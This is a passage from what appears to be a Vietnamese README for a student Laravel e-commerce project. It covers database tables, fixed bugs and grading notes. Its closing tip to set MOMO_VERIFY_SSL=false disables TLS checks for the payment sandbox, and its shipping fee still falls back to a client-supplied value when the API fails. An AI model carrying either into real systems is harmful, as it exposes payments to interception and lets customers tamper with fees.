| `wishlists` | Danh sách yêu thích |
| `coupons`, `coupon_usages` | Mã giảm giá và nhật ký sử dụng |
| `point_transactions` | Nhật ký điểm thưởng |
| `product_views` | Lịch sử duyệt sản phẩm |
| `faqs` | Câu hỏi thường gặp |
| `tickets`, `ticket_replies` | Hệ thống hỗ trợ khách hàng |
| `pages`, `posts` | CMS trang tĩnh & blog |

Cột thêm vào bảng cũ:

- `orders`: `admin_note`, `cancel_reason`, `cancelled_at`, `restocked_at`, `coupon_id`, `discount_amount`, `points_earned`
- `users`: `points`, `lifetime_spent`, `google_id`, `avatar`

---

## 6. LỖI ĐÃ SỬA SO VỚI BẢN CŨ

1. `CategorySeeder.php` khai báo nhầm `class DatabaseSeeder` → trùng tên class, gây lỗi autoload. Đã tách đúng trách nhiệm.
2. Tìm kiếm ở trang quản lý sản phẩm: `where(...)->orWhere(...)` không bọc closure khiến toán tử `OR` "nuốt" luôn điều kiện lọc trạng thái kho → trả kết quả sai. Đã bọc closure.
3. Phí vận chuyển trước đây lấy thẳng từ input ẩn do JS điền (khách sửa được bằng DevTools). Nay **server luôn gọi lại GHN để tính lại phí thật**, chỉ dùng giá trị client khi API lỗi.
4. `ProductController` dùng `$request->all()` → nay validate đầy đủ từng trường.
5. Chặn xóa sản phẩm đã nằm trong đơn hàng (tránh vỡ lịch sử đơn), khuyến nghị đặt số lượng = 0 để ngừng bán.

---

## 7. LƯU Ý KHI CHẤM BÀI

- Yêu cầu **PHP 8.0 trở lên** (code dùng `match()` và spread trong mảng).
- Cần bật extension `sqlsrv` / `pdo_sqlsrv` trong PHP.
- Email dùng SMTP Gmail khai trong `.env`; nếu SMTP lỗi thì đơn hàng **vẫn đặt được**, chỉ ghi log cảnh báo.
- Sandbox MoMo hay lỗi chứng chỉ trên Windows → đặt `MOMO_VERIFY_SSL=false` trong `.env` khi chạy local.
